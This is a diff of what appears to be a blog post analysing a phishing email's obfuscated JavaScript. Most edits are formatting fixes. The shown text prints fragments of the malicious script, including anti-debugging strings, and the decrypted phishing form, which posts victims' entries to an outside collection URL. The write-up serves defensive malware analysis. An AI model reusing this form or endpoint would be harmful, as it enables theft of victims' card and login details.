@@ -25,7 +25,7 @@ American Express card numbers always follow the format 3XXX XXXXXX XABBC[^1].
 
 **BB** = "00" for first primary card on the account. Increases by 1 for every new card on the account (01, 02, 03, etc.)
 
-**C** = Check digit according to the <a rel="noopener"` or `rel="noreferrer" href="https://en.wikipedia.org/wiki/Luhn_algorithm">Luhn algorithm</a>
+**C** = Check digit according to the <a rel="noopener" rel="noreferrer" href="https://en.wikipedia.org/wiki/Luhn_algorithm">Luhn algorithm</a>
 
 The scammers correctly had `00` and had a 1 in 10 chance of guessing the Luhn check digit.
 
@@ -146,7 +146,7 @@ The contents were very straight forward - it was completely empty besides a `scr
 </html>
 ```
 
-There HTML loads javascript from `transfrmedia.com`, which is apparently a "multidisciplinary media agency that aims to provide premium end-to-end media solutions to the event and music industries in a timely and cost effective manner". It's unknown if their service was compromised and used to host malware, whether they're a fake agency used as a front for distribution, or if they're the actual ones behind the faux email. Not relevant, but they also have a NS entry in their DNS that points to <a rel="noopener"` or `rel="noreferrer" href="kanye.ns.cloudflare.com">kanye.ns.cloudflare.com</a>.
+There HTML loads javascript from `transfrmedia.com`, which is apparently a "multidisciplinary media agency that aims to provide premium end-to-end media solutions to the event and music industries in a timely and cost effective manner". It's unknown if their service was compromised and used to host malware, whether they're a fake agency used as a front for distribution, or if they're the actual ones behind the faux email. Not relevant, but they also have a NS entry in their DNS that points to <a rel="noopener noreferrer" href="kanye.ns.cloudflare.com">kanye.ns.cloudflare.com</a>.
 
 
 <picture class="centered-image">
@@ -171,7 +171,7 @@ It was time to deobfuscate it.
 
 ### Deobfuscating JS
 
-I turned to <a rel="noopener"` or `rel="noreferrer" href="http://jsnice.org/">JSNice</a> to do some of the initial work. It's not a particularly smart tool but it removes a lot of the manual effort like type inference, hex->text, and function inference ordering.
+I turned to <a rel="noopener noreferrer" href="http://jsnice.org/">JSNice</a> to do some of the initial work. It's not a particularly smart tool but it removes a lot of the manual effort like type inference, hex->text, and function inference ordering.
 
 At this point we had something much more reasonable. Note that this will be a long file with lots of code, and we'll unpack it piece by piece.
 
@@ -298,8 +298,34 @@ function c(fnArgs) {
 The first declaration is an array `a`. I've omitted the full array above because the item at index 12 is a massive (>1mb) text blob, which I've replaced with "<blob>". It will be used to reference function names, types, and variables throughout the obfuscated program. We'll rename this to `data`.
 
 ```js
-var data = ["elPaf", "MpKsb", "Lyfyb", "WchjA", "apply", "xkowf", "function *\\( *\\)", "\\+\\+ *(?:_0x(?:[a-f0-9]){4,6}|(?:\\b|\\d)[a-z0-9]{1,4}(?:\\b|\\d))", "init", "test", "chain", "input", "<blob>", 
-"length", "write", "string", "constructor", "while (true) {}", "counter", "SteWJ", "WlTUB", "debu", "gger", "call", "stateObject", "oHeJH"];
+var data = [
+  "elPaf",
+  "MpKsb",
+  "Lyfyb",
+  "WchjA",
+  "apply",
+  "xkowf",
+  "function *\\( *\\)",
+  "\\+\\+ *(?:_0x(?:[a-f0-9]){4,6}|(?:\\b|\\d)[a-z0-9]{1,4}(?:\\b|\\d))",
+  "init",
+  "test",
+  "chain",
+  "input",
+  "<blob>",
+  "length",
+  "write",
+  "string",
+  "constructor",
+  "while (true) {}",
+  "counter",
+  "SteWJ",
+  "WlTUB",
+  "debu",
+  "gger",
+  "call",
+  "stateObject",
+  "oHeJH"
+];
 ```
 
 #### b
@@ -702,7 +728,7 @@ We need to unpack this even further.
 
 ### Second blob
 
-There is another large, encrypted blob, stored in ``. Fortunately we don't have to look at the logic, as the decryption function is provided for us. I'm not going to go into how the decryption is done, but all the functions and variables above are used in the process. There were actually some syntax errors (such as not having `var`, `let`, or `const` before variable names) but once those were fixed we could get the actual contents. I've included the relevant part below.
+There is another large, encrypted blob, stored in `OLnARWFQitgSyE`. Fortunately we don't have to look at the logic, as the decryption function is provided for us. I'm not going to go into how the decryption is done, but all the functions and variables above are used in the process. There were actually some syntax errors (such as not having `var`, `let`, or `const` before variable names) but once those were fixed we could get the actual contents. I've included the relevant part below.
 
 ```html
 <form name="0" id="0" action="http://souzoku-roots.com/gzipdb/data.php" autocomplete="off" method="post">
